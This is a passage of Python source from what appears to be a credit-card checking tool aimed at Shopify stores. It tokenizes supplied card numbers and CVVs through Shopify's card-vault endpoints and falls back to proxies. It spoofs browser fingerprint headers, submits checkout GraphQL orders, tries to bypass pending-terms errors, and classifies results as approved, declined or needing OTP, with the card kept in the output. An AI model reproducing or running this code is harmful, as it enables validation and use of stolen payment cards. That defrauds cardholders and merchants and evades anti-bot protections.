                # 5. Tokenize Card across Multi-Endpoints (Direct first, then Proxy)
                token_endpoints = [
                    "https://deposit.us.shopifycs.com/sessions",
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://checkout.shopifycs.com/sessions",
                ]
                card_json = {
                    "credit_card": {
                        "number": cc_num,
                        "month": int(mes),
                        "year": int(ano),
                        "verification_value": cvv,
                        "name": f"{fname} {lname}"
                    },
                    "payment_session_scope": urlparse(ourl).netloc
                }
                tok_headers = {
                    "accept": "application/json",
                    "content-type": "application/json",
                    "origin": "https://checkout.shopifycs.com",
                    "referer": "https://checkout.shopifycs.com/",
                    "user-agent": user_agent,
                    "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "cross-site",
                }

                async def _try_tokenize_sequential(endpoints, px=None):
                    try:
                        async with _create_async_client(proxy_url=px, timeout=15.0, chrome_version=fingerprint.get("_chrome_ver")) as tok_sess:
                            for ep in endpoints:
                                try:
                                    r = await tok_sess.post(ep, headers=tok_headers, json=card_json)
                                    if r.status_code == 200:
                                        sid = r.json().get("id")
                                        if sid:
                                            return sid
                                except Exception:
                                    continue
                    except Exception:
                        pass
                    return None

                sessionid = await _try_tokenize_sequential(token_endpoints, px=None)
                if not sessionid and active_proxy:
                    sessionid = await _try_tokenize_sequential(token_endpoints, px=active_proxy)

                if not sessionid:
                    return _respond(False, "PAYMENT_SESSION_FAILED")

                # 6. Prepare GraphQL Submit & Negotiation
                graphql_url = f"{ourl}/checkouts/unstable/graphql"

                def _make_graphql_headers():
                    h = {
                        "accept": "application/json",
                        "content-type": "application/json",
                        "origin": ourl,
                        "referer": f"{ourl}/",
                        "user-agent": user_agent,
                        "accept-language": fingerprint.get("Accept-Language", "en-US,en;q=0.9"),
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "x-checkout-one-session-token": session_token,
                        "x-checkout-web-deploy-stage": "production",
                        "x-checkout-web-server-handling": "fast",
                        "x-checkout-web-source-id": token.split("?")[0] if "?" in token else token,
                    }
                    for ch in ("Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform"):
                        if ch in fingerprint:
                            h[ch] = fingerprint[ch]
                    return h

                def _delivery_kwargs():
                    return dict(
                        requires_shipping=requires_shipping,
                        delivery_strategy_handle=delivery_strategy_handle,
                        delivery_option_handle=delivery_option_handle
                    )

                neg_got_receipt = False
                neg_receipt = None

                # Negotiation phase if shipping required
                if requires_shipping:
                    neg_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}"
                    neg_payload = {
                        "query": _SUBMIT_QUERY,
                        "variables": {
                            "input": {
                                "checkpointData": _checkpoint_data,
                                "sessionInput": {"sessionToken": session_token},
                                "queueToken": queue_token,
                                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                                "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=True, **_delivery_kwargs()),
                                "merchandise": {
                                    "merchandiseLines": [{
                                        "stableId": stable_id,
                                        "quantity": {"items": {"value": 1}},
                                        "expectedTotalPrice": {"any": True},
                                        "merchandise": {
                                            "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                                        },
                                        "lineComponentsSource": None,
                                        "lineComponents": [],
                                    }],
                                },
                                "payment": {
                                    "totalAmount": {"any": True},
                                    "paymentLines": [{
                                        "paymentMethod": {
                                            "directPaymentMethod": {
                                                "paymentMethodIdentifier": paymentMethodIdentifier,
                                                "sessionId": sessionid,
                                                "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                            },
                                        },
                                        "amount": {"any": True},
                                        "dueAt": None,
                                    }],
                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                },
                                "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": currency, "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
                                "tip": {"tipLines": []},
                                "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                                "note": {"message": None, "customAttributes": []},
                                "localizationExtension": {"fields": []},
                                "nonNegotiableTerms": None,
                                "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                                "optionalDuties": {"buyerRefusesDuties": False},
                            },
                            "attemptToken": f"{token}-neg-{random.random()}",
                            "metafields": [],
                            "analytics": {"requestUrl": f"{ourl}/checkouts/cn/{token}", "pageId": neg_page_id},
                        },
                        "operationName": "SubmitForCompletion",
                    }
                    try:
                        neg_resp = await session.post(graphql_url, headers=_make_graphql_headers(), json=neg_payload)
                        if neg_resp.status_code == 200:
                            neg_data = neg_resp.json()
                            neg_completion = neg_data.get("data", {}).get("submitForCompletion", {}) or {}
                            neg_receipt = neg_completion.get("receipt")
                            if neg_receipt and neg_receipt.get("id"):
                                neg_got_receipt = True
                    except Exception:
                        pass

                    # Refresh checkout page if negotiation didn't complete immediately
                    if not neg_got_receipt:
                        try:
                            ref = await session.get(str(checkout_resp.url), headers={"User-Agent": user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
                            if ref.status_code == 200:
                                rt = ref.text
                                nst = _RE_SESSION_TOKEN.search(rt)
                                if nst:
                                    session_token = nst.group(1)
                                nq = find_between(rt, 'queueToken&quot;:&quot;', '&quot;')
                                if nq:
                                    queue_token = nq
                                ns = find_between(rt, 'stableId&quot;:&quot;', '&quot;')
                                if ns:
                                    stable_id = ns
                                np_ = find_between(rt, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                                if np_:
                                    paymentMethodIdentifier = np_
                                nd = _extract_delivery_line_stable_id(rt)
                                if nd:
                                    delivery_line_stable_id = nd
                                nds = _extract_delivery_strategy_handle(rt)
                                if nds:
                                    delivery_strategy_handle = nds
                        except Exception:
                            pass

                # Final Submit
                receipt = neg_receipt if neg_got_receipt else None
                if not receipt:
                    graphql_headers = _make_graphql_headers()
                    random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}"
                    graphql_payload = {
                        "query": _SUBMIT_QUERY,
                        "variables": {
                            "input": {
                                "checkpointData": _checkpoint_data,
                                "sessionInput": {"sessionToken": session_token},
                                "queueToken": queue_token,
                                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                                "delivery": _build_delivery_payload(stable_id, delivery_line_stable_id, add1, city, zip_code, fname, lname, state_short, phone, destination_changed=False, **_delivery_kwargs()),
                                "merchandise": {
                                    "merchandiseLines": [{
                                        "stableId": stable_id,
                                        "quantity": {"items": {"value": 1}},
                                        "expectedTotalPrice": {"any": True},
                                        "merchandise": {
                                            "productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None},
                                        },
                                        "lineComponentsSource": None,
                                        "lineComponents": [],
                                    }],
                                },
                                "payment": {
                                    "totalAmount": {"any": True},
                                    "paymentLines": [{
                                        "paymentMethod": {
                                            "directPaymentMethod": {
                                                "paymentMethodIdentifier": paymentMethodIdentifier,
                                                "sessionId": sessionid,
                                                "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                            },
                                        },
                                        "amount": {"any": True},
                                        "dueAt": None,
                                    }],
                                    "billingAddress": {"streetAddress": {"address1": add1, "address2": "", "city": city, "countryCode": "US", "postalCode": zip_code, "company": "", "firstName": fname, "lastName": lname, "zoneCode": state_short, "phone": phone}},
                                },
                                "buyerIdentity": {"buyerIdentity": {"presentmentCurrency": currency, "countryCode": "US"}, "contactInfoV2": {"emailOrSms": {"value": email, "emailOrSmsChanged": False}}, "marketingConsent": [{"email": {"value": email}}], "shopPayOptInPhone": {"countryCode": "US"}},
                                "tip": {"tipLines": []},
                                "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                                "note": {"message": None, "customAttributes": []},
                                "localizationExtension": {"fields": []},
                                "nonNegotiableTerms": None,
                                "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                                "optionalDuties": {"buyerRefusesDuties": False},
                            },
                            "attemptToken": f"{token}-{random.random()}",
                            "metafields": [],
                            "analytics": {"requestUrl": f"{ourl}/checkouts/cn/{token}", "pageId": random_page_id},
                        },
                        "operationName": "SubmitForCompletion",
                    }

                    gr = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                    if gr.status_code != 200:
                        return _respond(False, f"GRAPHQL_HTTP_{gr.status_code}")

                    result_data = gr.json()
                    completion = result_data.get("data", {}).get("submitForCompletion", {}) or {}

                    if completion.get("errors"):
                        error_codes = [e.get("code") for e in completion["errors"] if e.get("code")]

                        # Terms bypass attempt
                        if any(c in error_codes for c in ("WAITING_PENDING_TERMS", "TAX_NEW_TAX_MUST_BE_ACCEPTED", "PENDINGTERMVIOLATION")):
                            terms_res = await _attempt_terms_bypass(
                                session, graphql_url, graphql_headers,
                                json.loads(json.dumps(graphql_payload)),
                                ourl, user_agent
                            )
                            if terms_res.get("bypassed"):
                                receipt = terms_res.get("receipt")
                            else:
                                return _respond(False, "WAITING_PENDING_TERMS")

                        approval_hits = [c for c in error_codes if c in APPROVAL_CODES]
                        decline_hits = [c for c in error_codes if c in DECLINE_CODES or c.startswith("PAYMENTS_CREDIT_CARD_BASE_")]
                        site_hits = [c for c in error_codes if c in SITE_SKIP_CODES]

                        if approval_hits:
                            code = approval_hits[0]
                            return _respond(True, code)
                        if decline_hits:
                            code = decline_hits[0]
                            clean = "CARD_DECLINED" if code in ("GENERIC_ERROR", "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE") else code
                            return _respond(True, clean)
                        if site_hits:
                            return _respond(False, "SITE_INCOMPATIBLE")
                        if "CHECKPOINT_DENIED" in error_codes or any("CAPTCHA" in str(c).upper() for c in error_codes):
                            return _respond(False, "CAPTCHA_REQUIRED")

                        return _respond(False, extract_clean_response(error_codes[0] if error_codes else "SUBMIT_REJECTED"))

                    receipt = completion.get("receipt")
                    if not receipt:
                        tn = completion.get("__typename", "SubmitFailed")
                        if tn == "CheckpointDenied":
                            return _respond(False, "CAPTCHA_REQUIRED")
                        if tn in ("Throttled", "TooManyRequests"):
                            return _respond(False, "THROTTLED")
                        return _respond(False, extract_clean_response(tn))

                # 7. Poll for Receipt
                if receipt:
                    receipt_id = receipt.get("id")
                    rtn = receipt.get("__typename")

                    if rtn == "ProcessedReceipt" or receipt.get("orderIdentity"):
                        return _respond(True, "ORDER_PLACED")
                    if rtn == "ActionRequiredReceipt":
                        return _respond(True, "OTP_REQUIRED")
                    if rtn == "FailedReceipt":
                        err = receipt.get("processingError", {}) or {}
                        code = err.get("code", "CARD_DECLINED")
                        clean = "CARD_DECLINED" if code in ("GENERIC_ERROR", "CARD_DECLINED", "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE", None) else code
                        return _respond(True, clean)

                    if rtn in ("ProcessingReceipt", "WaitingReceipt"):
                        for poll_i in range(8):
                            await asyncio.sleep(min(0.3 + poll_i * 0.1, 1.0))
                            poll_r = await session.post(
                                graphql_url,
                                headers=_make_graphql_headers(),
                                json={"query": _POLL_QUERY, "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"}
                            )
                            if poll_r.status_code != 200:
                                continue
                            rec = poll_r.json().get("data", {}).get("receipt", {}) or {}
                            rtn_sub = rec.get("__typename")
                            if rtn_sub == "ProcessedReceipt" or rec.get("orderIdentity"):
                                return _respond(True, "ORDER_PLACED")
                            if rtn_sub == "ActionRequiredReceipt":
                                return _respond(True, "OTP_REQUIRED")
                            if rtn_sub == "FailedReceipt":
                                err = rec.get("processingError", {}) or {}
                                code = err.get("code", "CARD_DECLINED")
                                clean = "CARD_DECLINED" if code in ("GENERIC_ERROR", "CARD_DECLINED", "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE", None) else code
                                return _respond(True, clean)

                        return _respond(False, "POLL_TIMEOUT")

                return _respond(False, "NO_RECEIPT_RETURNED")

        except Exception as e:
            err_msg = str(e)
            return _respond(False, extract_clean_response(err_msg))

    @staticmethod
    def _build_response(
        status: bool,
        response_code: Optional[str],
        gateway: str,
        price: float,
        cc: Optional[str],
        start_time: float,
        product_price: float = 0.0,
        product_title: str = "",
        shipping_price: float = 0.0,
        currency: str = "USD"
    ) -> Dict[str, Any]:
        cleaned = str(response_code).strip() if response_code else ""
        if not cleaned or cleaned in ('""', "''", "None", "null"):
            cleaned = "CARD_DECLINED" if status else "UNKNOWN_ERROR"

        p_price = round(product_price, 2) if product_price > 0 else round(price, 2)
        p_title = product_title.strip() if product_title else "Product"
        s_price = round(shipping_price, 2)

        return {
            "Gateway": gateway or "Shopify Payments",
            "Price": round(price, 2),
            "Product_Price": p_price,
            "Product_Title": p_title,
            "Shipping_Price": s_price,
            "Currency": currency or "USD",
            "Response": cleaned,
            "Status": status,
            "cc": cc or "",
            "time_taken": round(time.monotonic() - start_time, 2)
        }
